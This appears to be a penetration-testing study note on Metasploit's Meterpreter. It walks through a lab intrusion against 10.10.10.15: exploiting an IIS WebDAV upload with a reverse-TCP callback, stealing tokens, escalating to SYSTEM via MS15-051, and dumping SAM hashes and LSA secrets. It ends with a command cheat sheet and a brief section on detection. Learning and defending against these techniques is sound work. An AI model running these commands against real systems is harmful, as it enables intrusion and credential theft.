# Meterpreter

## Overview

**Meterpreter** is an advanced Metasploit payload designed to provide a powerful, in-memory post-exploitation session on a compromised host.

Unlike a basic shell, Meterpreter is:

- **stealthy**
- **powerful**
- **extensible**

It is intended to give functionality similar to a direct OS shell, but with many extra capabilities for post-exploitation, privilege escalation, credential access, and pivoting.

---

## What Makes Meterpreter Different

Meterpreter is not just a command shell. It is a **multi-faceted payload** that:

- runs primarily **in memory**
- uses **DLL injection**
- can establish a **stable encrypted session**
- supports **post-exploitation modules**
- can **migrate** into other processes
- can be extended at runtime with additional functionality

It can also be configured for persistence, though that depends on the engagement and the methods used.

---

## How Meterpreter Works

When a Meterpreter exploit succeeds, the process generally works like this:

1. The target executes the **initial stager**
   - examples: bind, reverse, findtag, passivex

2. The stager loads the **Reflective DLL**
   - the reflective loader handles the in-memory loading/injection process

3. The Meterpreter core initializes
   - establishes an **AES-encrypted communication channel**
   - sends a GET to Metasploit
   - Metasploit configures the client session

4. Meterpreter loads extensions
   - `stdapi` is loaded by default
   - `priv` is often loaded if admin-level actions are possible

All of this communication is transferred over the encrypted session.

---

## Design Goals

### Stealthy

Meterpreter is designed to reduce obvious forensic artifacts.

Key traits:

- resides in **memory**
- typically avoids writing files to disk after session establishment
- often injects into an existing process instead of launching a clearly suspicious one
- supports **process migration**
- uses **AES-encrypted communications**

Why this matters:

A normal payload or command shell may leave obvious artifacts such as files, processes, or unencrypted traffic. Meterpreter tries to reduce that footprint.

> Note: this does **not** mean Meterpreter is invisible. Modern EDR, memory inspection, logging, AMSI, and behavior-based monitoring can still detect it.

---

### Powerful

Meterpreter uses a **channelized communication system**, which allows multiple forms of interaction over one session.

Examples:

- native Meterpreter commands
- shell channels
- file transfer
- process interaction
- privilege operations

Why this matters:

You can spawn a shell, browse files, dump hashes, migrate processes, and run post-exploitation modules without needing to re-establish separate access methods.

---

### Extensible

Meterpreter can load additional functionality at runtime.

Benefits:

- functionality can be added without rebuilding the payload
- modules and extensions can be loaded on demand
- flexible during longer post-exploitation workflows

This is one of the main reasons Meterpreter remains useful in complex engagements.

---

# Running Meterpreter

To use Meterpreter, choose a Meterpreter-compatible payload appropriate for:

- the operating system
- architecture
- connection type
- network constraints

Examples:

- `windows/meterpreter/reverse_tcp`
- `windows/x64/meterpreter/reverse_https`
- `linux/x64/meterpreter/reverse_tcp`

To view payloads:

```bash
show payloads
```

---

# Example Workflow

## 1. Scan the Target

```bash
db_nmap -sV -p- -T5 -A 10.10.10.15
```

### Why use `db_nmap`

This imports the scan results directly into Metasploit’s database so you can later reference:

- discovered hosts
- services
- ports
- service versions

Check imported data:

```bash
hosts
services
```

---

## 2. Identify a Suitable Exploit

Example search:

```bash
search iis_webdav_upload_asp
```

Use the module:

```bash
use exploit/windows/iis/iis_webdav_upload_asp
```

By default, Metasploit may select:

```bash
windows/meterpreter/reverse_tcp
```

---

## 3. Review and Set Options

```bash
show options
```

Set required target and listener values:

```bash
set RHOST 10.10.10.15
set LHOST tun0
run
```

If successful, you should receive a Meterpreter session:

```bash
meterpreter >
```

---

# Important OPSEC Note

In the example exploit, the uploaded `.asp` file could not be deleted:

```text
[!] Deletion failed on /metasploit28857905.asp [403 Forbidden]
```

### Why this matters

Even though Meterpreter itself lives in memory, the **delivery mechanism** may leave artifacts behind.

Examples of artifacts:

- uploaded webshells
- temporary payload files
- suspicious service names
- registry changes
- created tasks
- logs of exploit activity

Defenders may detect:

- filenames matching known Metasploit patterns
- webshell artifacts
- unusual process injection
- suspicious outbound connections

So Meterpreter may be memory-resident, but the **initial foothold often is not artifact-free**.

---

# Basic Meterpreter Usage

Once inside Meterpreter, `help` shows available commands:

```bash
help
```

Some of the most common capabilities include:

- process enumeration
- token manipulation
- privilege escalation support
- file system interaction
- command shell spawning
- credential dumping
- post-exploitation module execution

---

# Common Meterpreter Commands

## Session Information

```bash
getuid
sysinfo
pwd
```

### Purpose

- `getuid` shows the security context of the session
- `sysinfo` displays target OS and architecture
- `pwd` shows current working directory

---

## Process Enumeration

```bash
ps
```

### Purpose

Lists running processes and often shows:

- PID
- architecture
- session
- user context
- binary path

This helps identify:

- viable migration targets
- privileged service processes
- injected payload locations
- interesting security products

---

## Token Theft

```bash
steal_token 1836
```

### Purpose

Attempts to impersonate the security token of another process.

Why this matters:

If your current process context is restricted but another process belongs to a more privileged account, token theft may improve your access.

After theft, verify with:

```bash
getuid
```

---

## Background a Session

```bash
bg
```

### Purpose

Sends the active Meterpreter session to the background so you can:

- run Metasploit modules
- search for exploits
- launch post modules
- return to the session later

List sessions:

```bash
sessions
```

Interact again:

```bash
sessions -i 1
```

---

# Privilege Escalation Workflow

A common Meterpreter flow is:

1. gain foothold
2. inspect current privileges
3. migrate or steal token
4. run local exploit suggestion
5. launch privilege escalation exploit
6. return in a SYSTEM-level session

---

## Local Exploit Suggester

Search:

```bash
search local_exploit_suggester
```

Use:

```bash
use post/multi/recon/local_exploit_suggester
set SESSION 1
run
```

### What it does

This module checks the target against known local privilege escalation opportunities based on:

- OS version
- patch level
- architecture
- Meterpreter session context

Example output may show:

- `ms14_058_track_popup_menu`
- `ms15_051_client_copy_image`
- `ms16_016_webdav`

These are possible local privilege escalation paths.

---

## Running a Local Privilege Escalation Exploit

Example:

```bash
use exploit/windows/local/ms15_051_client_copy_image
set SESSION 1
set LHOST tun0
run
```

If successful, a new Meterpreter session opens with higher privileges.

Verify:

```bash
getuid
```

Expected result:

```text
Server username: NT AUTHORITY\SYSTEM
```

---

# Credential Access and Secrets Dumping

Once SYSTEM is obtained, Meterpreter becomes much more useful for credential extraction.

---

## Dumping Local Password Hashes

```bash
hashdump
```

### What it does

Extracts local password hashes from the SAM.

Typical use cases:

- offline cracking
- pass-the-hash
- local admin password reuse analysis
- lateral movement

---

## Dumping SAM via Kiwi/Mimikatz-style Capability

```bash
lsa_dump_sam
```

### What it provides

- local SID
- SysKey
- SAMKey
- user RIDs
- LM hashes
- NTLM hashes

Useful when you want more structured local credential data.

---

## Dumping LSA Secrets

```bash
lsa_dump_secrets
```

### What it may reveal

- service account credentials
- ASP.NET worker passwords
- DPAPI system secrets
- NL$KM values
- machine-related secrets
- service account contexts
- occasionally plaintext or decryptable material

This can be extremely valuable for:

- service account compromise
- credential chaining
- DPAPI abuse
- pivoting to other systems

---

# Meterpreter Strengths in Practice

Meterpreter is particularly useful when you need to:

- escalate privileges
- dump credentials
- migrate processes
- maintain stable access
- tunnel or pivot
- run Metasploit post modules
- interact with the target beyond simple shell commands

Compared with a basic reverse shell, Meterpreter gives you far better post-exploitation ergonomics.

---

# Example End-to-End Workflow

## Step 1 – Scan and Identify Service

```bash
db_nmap -sV -p- -T5 -A 10.10.10.15
hosts
services
```

## Step 2 – Find Exploit

```bash
search iis_webdav_upload_asp
use exploit/windows/iis/iis_webdav_upload_asp
```

## Step 3 – Configure Listener and Target

```bash
set RHOST 10.10.10.15
set LHOST tun0
run
```

## Step 4 – Receive Meterpreter

```bash
meterpreter >
```

## Step 5 – Check Context

```bash
getuid
ps
```

## Step 6 – Steal Token / Improve Access

```bash
steal_token 1836
getuid
```

## Step 7 – Background Session

```bash
bg
```

## Step 8 – Suggest Local PrivEsc

```bash
use post/multi/recon/local_exploit_suggester
set SESSION 1
run
```

## Step 9 – Launch Local PrivEsc

```bash
use exploit/windows/local/ms15_051_client_copy_image
set SESSION 1
set LHOST tun0
run
```

## Step 10 – Verify SYSTEM

```bash
getuid
```

## Step 11 – Dump Credentials

```bash
hashdump
lsa_dump_sam
lsa_dump_secrets
```

---

# Practical Notes

## 1. Meterpreter is only as good as the session context

If you land in a weak context like:

- IIS app pool
- Network Service
- Local Service
- restricted user

then you will often need:

- token theft
- migration
- privilege escalation

before you can perform higher-value actions.

---

## 2. Some commands require SYSTEM

Commands like:

- `hashdump`
- `lsa_dump_sam`
- `lsa_dump_secrets`

generally require elevated privileges.

---

## 3. Initial access and post-exploitation are separate problems

A Meterpreter session gives strong post-exploitation capability, but you still need to think about:

- persistence
- cleanup
- forensic artifacts
- network controls
- privilege boundaries
- EDR response

---

## 4. Process migration can matter

Because the initial exploited process may die or be unstable, Meterpreter often benefits from migration into a more stable process.

Typical reasons to migrate:

- improve stability
- avoid losing the session
- align to a better privilege context
- reduce suspicion tied to the exploited process

---

# Why Meterpreter is Valuable

Think of Meterpreter as a **post-exploitation framework inside the payload**.

A normal shell gives you:

- command execution

Meterpreter gives you:

- command execution
- process awareness
- privilege manipulation
- credential access
- modules
- transport flexibility
- extensibility
- smoother operator workflow

It is essentially a multitool rather than just a terminal.

---

# High-Value Meterpreter Capabilities

- process enumeration
- token stealing
- migration
- local exploit suggestion
- privilege escalation support
- hash dumping
- LSA secret dumping
- file system interaction
- shell spawning
- session backgrounding
- post module integration

---

# Quick Commands

## Enumeration

```bash
getuid
sysinfo
pwd
ps
```

## Token / Privilege

```bash
steal_token <PID>
getuid
```

## Session Handling

```bash
bg
sessions
sessions -i <id>
```

## Local PrivEsc Suggestion

```bash
search local_exploit_suggester
use post/multi/recon/local_exploit_suggester
set SESSION <id>
run
```

## Credential Access

```bash
hashdump
lsa_dump_sam
lsa_dump_secrets
```

---

# Defensive Perspective

Blue teams can look for:

- suspicious in-memory injection
- unusual network egress patterns
- AES-encrypted callback traffic to suspicious endpoints
- parent/child process anomalies
- leftover payload artifacts
- webshells or random `.asp`/`.php` uploads
- service creation
- token theft behavior
- LSASS/SAM/LSA access attempts

Meterpreter is quieter than many alternatives, but it is not invisible.

---

# Tags

#metasploit  
#meterpreter  
#post-exploitation  
#privilege-escalation  
#windows  
#hashdump  
#lsa  
#redteam  
#exploit  
#obsidian